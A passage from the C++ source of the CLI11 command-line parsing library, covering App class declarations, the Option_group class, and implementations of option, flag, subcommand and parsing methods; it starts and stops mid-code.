        CLI11_NODISCARD std::string get_display_name(bool with_aliases = false) const;

        /// Check the name, case-insensitive and underscore insensitive if set
        CLI11_NODISCARD bool check_name(std::string name_to_check) const;

        /// Get the groups available directly from this option (in order)
        CLI11_NODISCARD std::vector<std::string> get_groups() const;

        /// This gets a vector of pointers with the original parse order
        CLI11_NODISCARD const std::vector<Option*>& parse_order() const { return parse_order_; }

        /// This returns the missing options from the current subcommand
        CLI11_NODISCARD std::vector<std::string> remaining(bool recurse = false) const;

        /// This returns the missing options in a form ready for processing by another command line program
        CLI11_NODISCARD std::vector<std::string> remaining_for_passthrough(bool recurse = false) const;

        /// This returns the number of remaining options, minus the -- separator
        CLI11_NODISCARD std::size_t remaining_size(bool recurse = false) const;

        ///@}

    protected:
        /// Check the options to make sure there are no conflicts.
        ///
        /// Currently checks to see if multiple positionals exist with unlimited args and checks if the min and max options
        /// are feasible
        void _validate() const;

        /// configure subcommands to enable parsing through the current object
        /// set the correct fallthrough and prefix for nameless subcommands and manage the automatic enable or disable
        /// makes sure parent is set correctly
        void _configure();

        /// Internal function to run (App) callback, bottom up
        void run_callback(bool final_mode = false, bool suppress_final_callback = false);

        /// Check to see if a subcommand is valid. Give up immediately if subcommand max has been reached.
        CLI11_NODISCARD bool _valid_subcommand(const std::string& current, bool ignore_used = true) const;

        /// Selects a Classifier enum based on the type of the current argument
        CLI11_NODISCARD detail::Classifier _recognize(const std::string& current,
            bool ignore_used_subcommands = true) const;

        // The parse function is now broken into several parts, and part of process

        /// Read and process a configuration file (main app only)
        void _process_config_file();

        /// Read and process a particular configuration file
        bool _process_config_file(const std::string& config_file, bool throw_error);

        /// Get envname options if not yet passed. Runs on *all* subcommands.
        void _process_env();

        /// Process callbacks. Runs on *all* subcommands.
        void _process_callbacks();

        /// Run help flag processing if any are found.
        ///
        /// The flags allow recursive calls to remember if there was a help flag on a parent.
        void _process_help_flags(bool trigger_help = false, bool trigger_all_help = false) const;

        /// Verify required options and cross requirements. Subcommands too (only if selected).
        void _process_requirements();

        /// Process callbacks and such.
        void _process();

        /// Throw an error if anything is left over and should not be.
        void _process_extras();

        /// Throw an error if anything is left over and should not be.
        /// Modifies the args to fill in the missing items before throwing.
        void _process_extras(std::vector<std::string>& args);

        /// Internal function to recursively increment the parsed counter on the current app as well unnamed subcommands
        void increment_parsed();

        /// Internal parse function
        void _parse(std::vector<std::string>& args);

        /// Internal parse function
        void _parse(std::vector<std::string>&& args);

        /// Internal function to parse a stream
        void _parse_stream(std::istream& input);

        /// Parse one config param, return false if not found in any subcommand, remove if it is
        ///
        /// If this has more than one dot.separated.name, go into the subcommand matching it
        /// Returns true if it managed to find the option, if false you'll need to remove the arg manually.
        void _parse_config(const std::vector<ConfigItem>& args);

        /// Fill in a single config option
        bool _parse_single_config(const ConfigItem& item, std::size_t level = 0);

        /// Parse "one" argument (some may eat more than one), delegate to parent if fails, add to missing if missing
        /// from main return false if the parse has failed and needs to return to parent
        bool _parse_single(std::vector<std::string>& args, bool& positional_only);

        /// Count the required remaining positional arguments
        CLI11_NODISCARD std::size_t _count_remaining_positionals(bool required_only = false) const;

        /// Count the required remaining positional arguments
        CLI11_NODISCARD bool _has_remaining_positionals() const;

        /// Parse a positional, go up the tree to check
        /// @param haltOnSubcommand if set to true the operation will not process subcommands merely return false
        /// Return true if the positional was used false otherwise
        bool _parse_positional(std::vector<std::string>& args, bool haltOnSubcommand);

        /// Locate a subcommand by name with two conditions, should disabled subcommands be ignored, and should used
        /// subcommands be ignored
        CLI11_NODISCARD App*
            _find_subcommand(const std::string& subc_name, bool ignore_disabled, bool ignore_used) const noexcept;

        /// Parse a subcommand, modify args and continue
        ///
        /// Unlike the others, this one will always allow fallthrough
        /// return true if the subcommand was processed false otherwise
        bool _parse_subcommand(std::vector<std::string>& args);

        /// Parse a short (false) or long (true) argument, must be at the top of the list
        /// if local_processing_only is set to true then fallthrough is disabled will return false if not found
        /// return true if the argument was processed or false if nothing was done
        bool _parse_arg(std::vector<std::string>& args, detail::Classifier current_type, bool local_processing_only);

        /// Trigger the pre_parse callback if needed
        void _trigger_pre_parse(std::size_t remaining_args);

        /// Get the appropriate parent to fallthrough to which is the first one that has a name or the main app
        App* _get_fallthrough_parent();

        /// Helper function to run through all possible comparisons of subcommand names to check there is no overlap
        CLI11_NODISCARD const std::string& _compare_subcommand_names(const App& subcom, const App& base) const;

        /// Helper function to place extra values in the most appropriate position
        void _move_to_missing(detail::Classifier val_type, const std::string& val);

    public:
        /// function that could be used by subclasses of App to shift options around into subcommands
        void _move_option(Option* opt, App* app);
    };  // namespace CLI

    /// Extension of App to better manage groups of options
    class Option_group : public App {
    public:
        Option_group(std::string group_description, std::string group_name, App* parent)
            : App(std::move(group_description), "", parent) {
            group(group_name);
            // option groups should have automatic fallthrough
            if (group_name.empty() || group_name.front() == '+') {
                // help will not be used by default in these contexts
                set_help_flag("");
                set_help_all_flag("");
            }
        }
        using App::add_option;
        /// Add an existing option to the Option_group
        Option* add_option(Option* opt) {
            if (get_parent() == nullptr) {
                throw OptionNotFound("Unable to locate the specified option");
            }
            get_parent()->_move_option(opt, this);
            return opt;
        }
        /// Add an existing option to the Option_group
        void add_options(Option* opt) { add_option(opt); }
        /// Add a bunch of options to the group
        template <typename... Args> void add_options(Option* opt, Args... args) {
            add_option(opt);
            add_options(args...);
        }
        using App::add_subcommand;
        /// Add an existing subcommand to be a member of an option_group
        App* add_subcommand(App* subcom) {
            App_p subc = subcom->get_parent()->get_subcommand_ptr(subcom);
            subc->get_parent()->remove_subcommand(subcom);
            add_subcommand(std::move(subc));
            return subcom;
        }
    };

    /// Helper function to enable one option group/subcommand when another is used
    CLI11_INLINE void TriggerOn(App* trigger_app, App* app_to_enable);

    /// Helper function to enable one option group/subcommand when another is used
    CLI11_INLINE void TriggerOn(App* trigger_app, std::vector<App*> apps_to_enable);

    /// Helper function to disable one option group/subcommand when another is used
    CLI11_INLINE void TriggerOff(App* trigger_app, App* app_to_enable);

    /// Helper function to disable one option group/subcommand when another is used
    CLI11_INLINE void TriggerOff(App* trigger_app, std::vector<App*> apps_to_enable);

    /// Helper function to mark an option as deprecated
    CLI11_INLINE void deprecate_option(Option* opt, const std::string& replacement = "");

    /// Helper function to mark an option as deprecated
    inline void deprecate_option(App* app, const std::string& option_name, const std::string& replacement = "") {
        auto* opt = app->get_option(option_name);
        deprecate_option(opt, replacement);
    }

    /// Helper function to mark an option as deprecated
    inline void deprecate_option(App& app, const std::string& option_name, const std::string& replacement = "") {
        auto* opt = app.get_option(option_name);
        deprecate_option(opt, replacement);
    }

    /// Helper function to mark an option as retired
    CLI11_INLINE void retire_option(App* app, Option* opt);

    /// Helper function to mark an option as retired
    CLI11_INLINE void retire_option(App& app, Option* opt);

    /// Helper function to mark an option as retired
    CLI11_INLINE void retire_option(App* app, const std::string& option_name);

    /// Helper function to mark an option as retired
    CLI11_INLINE void retire_option(App& app, const std::string& option_name);

    namespace detail {
        /// This class is simply to allow tests access to App's protected functions
        struct AppFriend {
#ifdef CLI11_CPP14

            /// Wrap _parse_short, perfectly forward arguments and return
            template <typename... Args> static decltype(auto) parse_arg(App* app, Args &&...args) {
                return app->_parse_arg(std::forward<Args>(args)...);
            }

            /// Wrap _parse_subcommand, perfectly forward arguments and return
            template <typename... Args> static decltype(auto) parse_subcommand(App* app, Args &&...args) {
                return app->_parse_subcommand(std::forward<Args>(args)...);
            }
#else
            /// Wrap _parse_short, perfectly forward arguments and return
            template <typename... Args>
            static auto parse_arg(App* app, Args &&...args) ->
                typename std::result_of<decltype (&App::_parse_arg)(App, Args...)>::type {
                return app->_parse_arg(std::forward<Args>(args)...);
            }

            /// Wrap _parse_subcommand, perfectly forward arguments and return
            template <typename... Args>
            static auto parse_subcommand(App* app, Args &&...args) ->
                typename std::result_of<decltype (&App::_parse_subcommand)(App, Args...)>::type {
                return app->_parse_subcommand(std::forward<Args>(args)...);
            }
#endif
            /// Wrap the fallthrough parent function to make sure that is working correctly
            static App* get_fallthrough_parent(App* app) { return app->_get_fallthrough_parent(); }
        };
    }  // namespace detail




    CLI11_INLINE App::App(std::string app_description, std::string app_name, App* parent)
        : name_(std::move(app_name)), description_(std::move(app_description)), parent_(parent) {
        // Inherit if not from a nullptr
        if (parent_ != nullptr) {
            if (parent_->help_ptr_ != nullptr)
                set_help_flag(parent_->help_ptr_->get_name(false, true), parent_->help_ptr_->get_description());
            if (parent_->help_all_ptr_ != nullptr)
                set_help_all_flag(parent_->help_all_ptr_->get_name(false, true), parent_->help_all_ptr_->get_description());

            /// OptionDefaults
            option_defaults_ = parent_->option_defaults_;

            // INHERITABLE
            failure_message_ = parent_->failure_message_;
            allow_extras_ = parent_->allow_extras_;
            allow_config_extras_ = parent_->allow_config_extras_;
            prefix_command_ = parent_->prefix_command_;
            immediate_callback_ = parent_->immediate_callback_;
            ignore_case_ = parent_->ignore_case_;
            ignore_underscore_ = parent_->ignore_underscore_;
            fallthrough_ = parent_->fallthrough_;
            validate_positionals_ = parent_->validate_positionals_;
            validate_optional_arguments_ = parent_->validate_optional_arguments_;
            configurable_ = parent_->configurable_;
            allow_windows_style_options_ = parent_->allow_windows_style_options_;
            group_ = parent_->group_;
            usage_ = parent_->usage_;
            footer_ = parent_->footer_;
            formatter_ = parent_->formatter_;
            config_formatter_ = parent_->config_formatter_;
            require_subcommand_max_ = parent_->require_subcommand_max_;
        }
    }

    CLI11_NODISCARD CLI11_INLINE char** App::ensure_utf8(char** argv) {
#ifdef _WIN32
        (void)argv;

        normalized_argv_ = detail::compute_win32_argv();

        if (!normalized_argv_view_.empty()) {
            normalized_argv_view_.clear();
        }

        normalized_argv_view_.reserve(normalized_argv_.size());
        for (auto& arg : normalized_argv_) {
            // using const_cast is well-defined, string is known to not be const.
            normalized_argv_view_.push_back(const_cast<char*>(arg.data()));
        }

        return normalized_argv_view_.data();
#else
        return argv;
#endif
    }

    CLI11_INLINE App* App::name(std::string app_name) {

        if (parent_ != nullptr) {
            std::string oname = name_;
            name_ = app_name;
            const auto& res = _compare_subcommand_names(*this, *_get_fallthrough_parent());
            if (!res.empty()) {
                name_ = oname;
                throw(OptionAlreadyAdded(app_name + " conflicts with existing subcommand names"));
            }
        }
        else {
            name_ = app_name;
        }
        has_automatic_name_ = false;
        return this;
    }

    CLI11_INLINE App* App::alias(std::string app_name) {
        if (app_name.empty() || !detail::valid_alias_name_string(app_name)) {
            throw IncorrectConstruction("Aliases may not be empty or contain newlines or null characters");
        }
        if (parent_ != nullptr) {
            aliases_.push_back(app_name);
            const auto& res = _compare_subcommand_names(*this, *_get_fallthrough_parent());
            if (!res.empty()) {
                aliases_.pop_back();
                throw(OptionAlreadyAdded("alias already matches an existing subcommand: " + app_name));
            }
        }
        else {
            aliases_.push_back(app_name);
        }

        return this;
    }

    CLI11_INLINE App* App::immediate_callback(bool immediate) {
        immediate_callback_ = immediate;
        if (immediate_callback_) {
            if (final_callback_ && !(parse_complete_callback_)) {
                std::swap(final_callback_, parse_complete_callback_);
            }
        }
        else if (!(final_callback_) && parse_complete_callback_) {
            std::swap(final_callback_, parse_complete_callback_);
        }
        return this;
    }

    CLI11_INLINE App* App::ignore_case(bool value) {
        if (value && !ignore_case_) {
            ignore_case_ = true;
            auto* p = (parent_ != nullptr) ? _get_fallthrough_parent() : this;
            const auto& match = _compare_subcommand_names(*this, *p);
            if (!match.empty()) {
                ignore_case_ = false;  // we are throwing so need to be exception invariant
                throw OptionAlreadyAdded("ignore case would cause subcommand name conflicts: " + match);
            }
        }
        ignore_case_ = value;
        return this;
    }

    CLI11_INLINE App* App::ignore_underscore(bool value) {
        if (value && !ignore_underscore_) {
            ignore_underscore_ = true;
            auto* p = (parent_ != nullptr) ? _get_fallthrough_parent() : this;
            const auto& match = _compare_subcommand_names(*this, *p);
            if (!match.empty()) {
                ignore_underscore_ = false;
                throw OptionAlreadyAdded("ignore underscore would cause subcommand name conflicts: " + match);
            }
        }
        ignore_underscore_ = value;
        return this;
    }

    CLI11_INLINE Option* App::add_option(std::string option_name,
        callback_t option_callback,
        std::string option_description,
        bool defaulted,
        std::function<std::string()> func) {
        Option myopt{ option_name, option_description, option_callback, this, allow_non_standard_options_ };

        if (std::find_if(std::begin(options_), std::end(options_), [&myopt](const Option_p& v) { return *v == myopt; }) ==
            std::end(options_)) {
            if (myopt.lnames_.empty() && myopt.snames_.empty()) {
                // if the option is positional only there is additional potential for ambiguities in config files and needs
                // to be checked
                std::string test_name = "--" + myopt.get_single_name();
                if (test_name.size() == 3) {
                    test_name.erase(0, 1);
                }

                auto* op = get_option_no_throw(test_name);
                if (op != nullptr && op->get_configurable()) {
                    throw(OptionAlreadyAdded("added option positional name matches existing option: " + test_name));
                }
            }
            else if (parent_ != nullptr) {
                for (auto& ln : myopt.lnames_) {
                    auto* op = parent_->get_option_no_throw(ln);
                    if (op != nullptr && op->get_configurable()) {
                        throw(OptionAlreadyAdded("added option matches existing positional option: " + ln));
                    }
                }
                for (auto& sn : myopt.snames_) {
                    auto* op = parent_->get_option_no_throw(sn);
                    if (op != nullptr && op->get_configurable()) {
                        throw(OptionAlreadyAdded("added option matches existing positional option: " + sn));
                    }
                }
            }
            if (allow_non_standard_options_ && !myopt.snames_.empty()) {
                for (auto& sname : myopt.snames_) {
                    if (sname.length() > 1) {
                        std::string test_name;
                        test_name.push_back('-');
                        test_name.push_back(sname.front());
                        auto* op = get_option_no_throw(test_name);
                        if (op != nullptr) {
                            throw(OptionAlreadyAdded("added option interferes with existing short option: " + sname));
                        }
                    }
                }
                for (auto& opt : options_) {
                    for (const auto& osn : opt->snames_) {
                        if (osn.size() > 1) {
                            std::string test_name;
                            test_name.push_back(osn.front());
                            if (myopt.check_sname(test_name)) {
                                throw(OptionAlreadyAdded("added option interferes with existing non standard option: " +
                                    osn));
                            }
                        }
                    }
                }
            }
            options_.emplace_back();
            Option_p& option = options_.back();
            option.reset(new Option(option_name, option_description, option_callback, this, allow_non_standard_options_));

            // Set the default string capture function
            option->default_function(func);

            // For compatibility with CLI11 1.7 and before, capture the default string here
            if (defaulted)
                option->capture_default_str();

            // Transfer defaults to the new option
            option_defaults_.copy_to(option.get());

            // Don't bother to capture if we already did
            if (!defaulted && option->get_always_capture_default())
                option->capture_default_str();

            return option.get();
        }
        // we know something matches now find what it is so we can produce more error information
        for (auto& opt : options_) {
            const auto& matchname = opt->matching_name(myopt);
            if (!matchname.empty()) {
                throw(OptionAlreadyAdded("added option matched existing option name: " + matchname));
            }
        }
        // this line should not be reached the above loop should trigger the throw
        throw(OptionAlreadyAdded("added option matched existing option name"));  // LCOV_EXCL_LINE
    }

    CLI11_INLINE Option* App::set_help_flag(std::string flag_name, const std::string& help_description) {
        // take flag_description by const reference otherwise add_flag tries to assign to help_description
        if (help_ptr_ != nullptr) {
            remove_option(help_ptr_);
            help_ptr_ = nullptr;
        }

        // Empty name will simply remove the help flag
        if (!flag_name.empty()) {
            help_ptr_ = add_flag(flag_name, help_description);
            help_ptr_->configurable(false);
        }

        return help_ptr_;
    }

    CLI11_INLINE Option* App::set_help_all_flag(std::string help_name, const std::string& help_description) {
        // take flag_description by const reference otherwise add_flag tries to assign to flag_description
        if (help_all_ptr_ != nullptr) {
            remove_option(help_all_ptr_);
            help_all_ptr_ = nullptr;
        }

        // Empty name will simply remove the help all flag
        if (!help_name.empty()) {
            help_all_ptr_ = add_flag(help_name, help_description);
            help_all_ptr_->configurable(false);
        }

        return help_all_ptr_;
    }

    CLI11_INLINE Option*
        App::set_version_flag(std::string flag_name, const std::string& versionString, const std::string& version_help) {
        // take flag_description by const reference otherwise add_flag tries to assign to version_description
        if (version_ptr_ != nullptr) {
            remove_option(version_ptr_);
            version_ptr_ = nullptr;
        }

        // Empty name will simply remove the version flag
        if (!flag_name.empty()) {
            version_ptr_ = add_flag_callback(
                flag_name, [versionString]() { throw(CLI::CallForVersion(versionString, 0)); }, version_help);
            version_ptr_->configurable(false);
        }

        return version_ptr_;
    }

    CLI11_INLINE Option*
        App::set_version_flag(std::string flag_name, std::function<std::string()> vfunc, const std::string& version_help) {
        if (version_ptr_ != nullptr) {
            remove_option(version_ptr_);
            version_ptr_ = nullptr;
        }

        // Empty name will simply remove the version flag
        if (!flag_name.empty()) {
            version_ptr_ =
                add_flag_callback(flag_name, [vfunc]() { throw(CLI::CallForVersion(vfunc(), 0)); }, version_help);
            version_ptr_->configurable(false);
        }

        return version_ptr_;
    }

    CLI11_INLINE Option* App::_add_flag_internal(std::string flag_name, CLI::callback_t fun, std::string flag_description) {
        Option* opt = nullptr;
        if (detail::has_default_flag_values(flag_name)) {
            // check for default values and if it has them
            auto flag_defaults = detail::get_default_flag_values(flag_name);
            detail::remove_default_flag_values(flag_name);
            opt = add_option(std::move(flag_name), std::move(fun), std::move(flag_description), false);
            for (const auto& fname : flag_defaults)
                opt->fnames_.push_back(fname.first);
            opt->default_flag_values_ = std::move(flag_defaults);
        }
        else {
            opt = add_option(std::move(flag_name), std::move(fun), std::move(flag_description), false);
        }
        // flags cannot have positional values
        if (opt->get_positional()) {
            auto pos_name = opt->get_name(true);
            remove_option(opt);
            throw IncorrectConstruction::PositionalFlag(pos_name);
        }
        opt->multi_option_policy(MultiOptionPolicy::TakeLast);
        opt->expected(0);
        opt->required(false);
        return opt;
    }

    CLI11_INLINE Option* App::add_flag_callback(std::string flag_name,
        std::function<void(void)> function,  ///< A function to call, void(void)
        std::string flag_description) {

        CLI::callback_t fun = [function](const CLI::results_t& res) {
            using CLI::detail::lexical_cast;
            bool trigger{ false };
            auto result = lexical_cast(res[0], trigger);
            if (result && trigger) {
                function();
            }
            return result;
            };
        return _add_flag_internal(flag_name, std::move(fun), std::move(flag_description));
    }

    CLI11_INLINE Option*
        App::add_flag_function(std::string flag_name,
            std::function<void(std::int64_t)> function,  ///< A function to call, void(int)
            std::string flag_description) {

        CLI::callback_t fun = [function](const CLI::results_t& res) {
            using CLI::detail::lexical_cast;
            std::int64_t flag_count{ 0 };
            lexical_cast(res[0], flag_count);
            function(flag_count);
            return true;
            };
        return _add_flag_internal(flag_name, std::move(fun), std::move(flag_description))
            ->multi_option_policy(MultiOptionPolicy::Sum);
    }

    CLI11_INLINE Option* App::set_config(std::string option_name,
        std::string default_filename,
        const std::string& help_message,
        bool config_required) {

        // Remove existing config if present
        if (config_ptr_ != nullptr) {
            remove_option(config_ptr_);
            config_ptr_ = nullptr;  // need to remove the config_ptr completely
        }

        // Only add config if option passed
        if (!option_name.empty()) {
            config_ptr_ = add_option(option_name, help_message);
            if (config_required) {
                config_ptr_->required();
            }
            if (!default_filename.empty()) {
                config_ptr_->default_str(std::move(default_filename));
                config_ptr_->force_callback_ = true;
            }
            config_ptr_->configurable(false);
            // set the option to take the last value and reverse given by default
            config_ptr_->multi_option_policy(MultiOptionPolicy::Reverse);
        }

        return config_ptr_;
    }

    CLI11_INLINE bool App::remove_option(Option* opt) {
        // Make sure no links exist
        for (Option_p& op : options_) {
            op->remove_needs(opt);
            op->remove_excludes(opt);
        }

        if (help_ptr_ == opt)
            help_ptr_ = nullptr;
        if (help_all_ptr_ == opt)
            help_all_ptr_ = nullptr;

        auto iterator =
            std::find_if(std::begin(options_), std::end(options_), [opt](const Option_p& v) { return v.get() == opt; });
        if (iterator != std::end(options_)) {
            options_.erase(iterator);
            return true;
        }
        return false;
    }

    CLI11_INLINE App* App::add_subcommand(std::string subcommand_name, std::string subcommand_description) {
        if (!subcommand_name.empty() && !detail::valid_name_string(subcommand_name)) {
            if (!detail::valid_first_char(subcommand_name[0])) {
                throw IncorrectConstruction(
                    "Subcommand name starts with invalid character, '!' and '-' and control characters");
            }
            for (auto c : subcommand_name) {
                if (!detail::valid_later_char(c)) {
                    throw IncorrectConstruction(std::string("Subcommand name contains invalid character ('") + c +
                        "'), all characters are allowed except"
                        "'=',':','{','}', ' ', and control characters");
                }
            }
        }
        CLI::App_p subcom = std::shared_ptr<App>(new App(std::move(subcommand_description), subcommand_name, this));
        return add_subcommand(std::move(subcom));
    }

    CLI11_INLINE App* App::add_subcommand(CLI::App_p subcom) {
        if (!subcom)
            throw IncorrectConstruction("passed App is not valid");
        auto* ckapp = (name_.empty() && parent_ != nullptr) ? _get_fallthrough_parent() : this;
        const auto& mstrg = _compare_subcommand_names(*subcom, *ckapp);
        if (!mstrg.empty()) {
            throw(OptionAlreadyAdded("subcommand name or alias matches existing subcommand: " + mstrg));
        }
        subcom->parent_ = this;
        subcommands_.push_back(std::move(subcom));
        return subcommands_.back().get();
    }

    CLI11_INLINE bool App::remove_subcommand(App* subcom) {
        // Make sure no links exist
        for (App_p& sub : subcommands_) {
            sub->remove_excludes(subcom);
            sub->remove_needs(subcom);
        }

        auto iterator = std::find_if(
            std::begin(subcommands_), std::end(subcommands_), [subcom](const App_p& v) { return v.get() == subcom; });
        if (iterator != std::end(subcommands_)) {
            subcommands_.erase(iterator);
            return true;
        }
        return false;
    }

    CLI11_INLINE App* App::get_subcommand(const App* subcom) const {
        if (subcom == nullptr)
            throw OptionNotFound("nullptr passed");
        for (const App_p& subcomptr : subcommands_)
            if (subcomptr.get() == subcom)
                return subcomptr.get();
        throw OptionNotFound(subcom->get_name());
    }

    CLI11_NODISCARD CLI11_INLINE App* App::get_subcommand(std::string subcom) const {
        auto* subc = _find_subcommand(subcom, false, false);
        if (subc == nullptr)
            throw OptionNotFound(subcom);
        return subc;
    }

    CLI11_NODISCARD CLI11_INLINE App* App::get_subcommand_no_throw(std::string subcom) const noexcept {
        return _find_subcommand(subcom, false, false);
    }

    CLI11_NODISCARD CLI11_INLINE App* App::get_subcommand(int index) const {
        if (index >= 0) {
            auto uindex = static_cast<unsigned>(index);
            if (uindex < subcommands_.size())
                return subcommands_[uindex].get();
        }
        throw OptionNotFound(std::to_string(index));
    }

    CLI11_INLINE CLI::App_p App::get_subcommand_ptr(App* subcom) const {
        if (subcom == nullptr)
            throw OptionNotFound("nullptr passed");
        for (const App_p& subcomptr : subcommands_)
            if (subcomptr.get() == subcom)
                return subcomptr;
        throw OptionNotFound(subcom->get_name());
    }

    CLI11_NODISCARD CLI11_INLINE CLI::App_p App::get_subcommand_ptr(std::string subcom) const {
        for (const App_p& subcomptr : subcommands_)
            if (subcomptr->check_name(subcom))
                return subcomptr;
        throw OptionNotFound(subcom);
    }

    CLI11_NODISCARD CLI11_INLINE CLI::App_p App::get_subcommand_ptr(int index) const {
        if (index >= 0) {
            auto uindex = static_cast<unsigned>(index);
            if (uindex < subcommands_.size())
                return subcommands_[uindex];
        }
        throw OptionNotFound(std::to_string(index));
    }

    CLI11_NODISCARD CLI11_INLINE CLI::App* App::get_option_group(std::string group_name) const {
        for (const App_p& app : subcommands_) {
            if (app->name_.empty() && app->group_ == group_name) {
                return app.get();
            }
        }
        throw OptionNotFound(group_name);
    }

    CLI11_NODISCARD CLI11_INLINE std::size_t App::count_all() const {
        std::size_t cnt{ 0 };
        for (const auto& opt : options_) {
            cnt += opt->count();
        }
        for (const auto& sub : subcommands_) {
            cnt += sub->count_all();
        }
        if (!get_name().empty()) {  // for named subcommands add the number of times the subcommand was called
            cnt += parsed_;
        }
        return cnt;
    }

    CLI11_INLINE void App::clear() {

        parsed_ = 0;
        pre_parse_called_ = false;

        missing_.clear();
        parsed_subcommands_.clear();
        for (const Option_p& opt : options_) {
            opt->clear();
        }
        for (const App_p& subc : subcommands_) {
            subc->clear();
        }
    }

    CLI11_INLINE void App::parse(int argc, const char* const* argv) { parse_char_t(argc, argv); }
    CLI11_INLINE void App::parse(int argc, const wchar_t* const* argv) { parse_char_t(argc, argv); }

    namespace detail {

        // Do nothing or perform narrowing
        CLI11_INLINE const char* maybe_narrow(const char* str) { return str; }
        CLI11_INLINE std::string maybe_narrow(const wchar_t* str) { return narrow(str); }

    }  // namespace detail

    template <class CharT> CLI11_INLINE void App::parse_char_t(int argc, const CharT* const* argv) {
        // If the name is not set, read from command line
        if (name_.empty() || has_automatic_name_) {
            has_automatic_name_ = true;
            name_ = detail::maybe_narrow(argv[0]);
        }

        std::vector<std::string> args;
        args.reserve(static_cast<std::size_t>(argc) - 1U);
        for (auto i = static_cast<std::size_t>(argc) - 1U; i > 0U; --i)
            args.emplace_back(detail::maybe_narrow(argv[i]));

        parse(std::move(args));
    }

    CLI11_INLINE void App::parse(std::string commandline, bool program_name_included) {

        if (program_name_included) {
            auto nstr = detail::split_program_name(commandline);
            if ((name_.empty()) || (has_automatic_name_)) {
                has_automatic_name_ = true;
                name_ = nstr.first;
            }
            commandline = std::move(nstr.second);
        }
        else {
            detail::trim(commandline);
        }
        // the next section of code is to deal with quoted arguments after an '=' or ':' for windows like operations
        if (!commandline.empty()) {
            commandline = detail::find_and_modify(commandline, "=", detail::escape_detect);
            if (allow_windows_style_options_)
                commandline = detail::find_and_modify(commandline, ":", detail::escape_detect);
        }

        auto args = detail::split_up(std::move(commandline));
        // remove all empty strings
        args.erase(std::remove(args.begin(), args.end(), std::string{}), args.end());
        try {
            detail::remove_quotes(args);
        }
        catch (const std::invalid_argument& arg) {
            throw CLI::ParseError(arg.what(), CLI::ExitCodes::InvalidError);
        }
        std::reverse(args.begin(), args.end());
        parse(std::move(args));
    }

    CLI11_INLINE void App::parse(std::wstring commandline, bool program_name_included) {
        parse(narrow(commandline), program_name_included);
    }

    CLI11_INLINE void App::parse(std::vector<std::string>& args) {
        // Clear if parsed
        if (parsed_ > 0)
            clear();

        // parsed_ is incremented in commands/subcommands,
        // but placed here to make sure this is cleared when
        // running parse after an error is thrown, even by _validate or _configure.
        parsed_ = 1;
        _validate();
        _configure();
        // set the parent as nullptr as this object should be the top now
        parent_ = nullptr;
        parsed_ = 0;

        _parse(args);
        run_callback();
    }

    CLI11_INLINE void App::parse(std::vector<std::string>&& args) {
        // Clear if parsed
        if (parsed_ > 0)
            clear();

        // parsed_ is incremented in commands/subcommands,
        // but placed here to make sure this is cleared when
        // running parse after an error is thrown, even by _validate or _configure.
        parsed_ = 1;
        _validate();
        _configure();
        // set the parent as nullptr as this object should be the top now
        parent_ = nullptr;
        parsed_ = 0;

        _parse(std::move(args));
        run_callback();
    }

    CLI11_INLINE void App::parse_from_stream(std::istream& input) {
        if (parsed_ == 0) {
            _validate();
            _configure();
            // set the parent as nullptr as this object should be the top now
        }

        _parse_stream(input);
        run_callback();
    }

    CLI11_INLINE int App::exit(const Error& e, std::ostream& out, std::ostream& err) const {

        /// Avoid printing anything if this is a CLI::RuntimeError
        if (e.get_name() == "RuntimeError")
            return e.get_exit_code();

        if (e.get_name() == "CallForHelp") {
            out << help();
            return e.get_exit_code();
        }

        if (e.get_name() == "CallForAllHelp") {
            out << help("", AppFormatMode::All);
            return e.get_exit_code();
        }

        if (e.get_name() == "CallForVersion") {
            out << e.what() << '\n';
            return e.get_exit_code();
        }

        if (e.get_exit_code() != static_cast<int>(ExitCodes::Success)) {
            if (failure_message_)
                err << failure_message_(this, e) << std::flush;
        }

        return e.get_exit_code();
    }

    CLI11_INLINE std::vector<const App*> App::get_subcommands(const std::function<bool(const App*)>& filter) const {
        std::vector<const App*> subcomms(subcommands_.size());
        std::transform(
            std::begin(subcommands_), std::end(subcommands_), std::begin(subcomms), [](const App_p& v) { return v.get(); });

        if (filter) {
            subcomms.erase(std::remove_if(std::begin(subcomms),
                std::end(subcomms),
                [&filter](const App* app) { return !filter(app); }),
                std::end(subcomms));
        }

        return subcomms;
    }

    CLI11_INLINE std::vector<App*> App::get_subcommands(const std::function<bool(App*)>& filter) {
        std::vector<App*> subcomms(subcommands_.size());
        std::transform(
            std::begin(subcommands_), std::end(subcommands_), std::begin(subcomms), [](const App_p& v) { return v.get(); });

        if (filter) {
            subcomms.erase(
                std::remove_if(std::begin(subcomms), std::end(subcomms), [&filter](App* app) { return !filter(app); }),
                std::end(subcomms));
        }

        return subcomms;
    }

    CLI11_INLINE bool App::remove_excludes(Option* opt) {
        auto iterator = std::find(std::begin(exclude_options_), std::end(exclude_options_), opt);
        if (iterator == std::end(exclude_options_)) {
            return false;
        }
        exclude_options_.erase(iterator);
        return true;
    }

    CLI11_INLINE bool App::remove_excludes(App* app) {
        auto iterator = std::find(std::begin(exclude_subcommands_), std::end(exclude_subcommands_), app);
        if (iterator == std::end(exclude_subcommands_)) {
            return false;
        }
        auto* other_app = *iterator;
        exclude_subcommands_.erase(iterator);
        other_app->remove_excludes(this);
        return true;
    }

    CLI11_INLINE bool App::remove_needs(Option* opt) {
        auto iterator = std::find(std::begin(need_options_), std::end(need_options_), opt);
        if (iterator == std::end(need_options_)) {
            return false;
        }
        need_options_.erase(iterator);
        return true;
    }

    CLI11_INLINE bool App::remove_needs(App* app) {
        auto iterator = std::find(std::begin(need_subcommands_), std::end(need_subcommands_), app);
        if (iterator == std::end(need_subcommands_)) {
            return false;
        }
        need_subcommands_.erase(iterator);
        return true;
    }

    CLI11_NODISCARD CLI11_INLINE std::string App::help(std::string prev, AppFormatMode mode) const {
        if (prev.empty())
            prev = get_name();
        else
            prev += " " + get_name();

        // Delegate to subcommand if needed
        auto selected_subcommands = get_subcommands();
        if (!selected_subcommands.empty()) {
            return selected_subcommands.back()->help(prev, mode);
        }
        return formatter_->make_help(this, prev, mode);
    }

    CLI11_NODISCARD CLI11_INLINE std::string App::version() const {
        std::string val;
        if (version_ptr_ != nullptr) {
            // copy the results for reuse later
            results_t rv = version_ptr_->results();
            version_ptr_->clear();
            version_ptr_->add_result("true");
            try {
                version_ptr_->run_callback();
            }
            catch (const CLI::CallForVersion& cfv) {
                val = cfv.what();
            }
            version_ptr_->clear();
            version_ptr_->add_result(rv);
        }
        return val;
    }

    CLI11_INLINE std::vector<const Option*> App::get_options(const std::function<bool(const Option*)> filter) const {
        std::vector<const Option*> options(options_.size());
        std::transform(
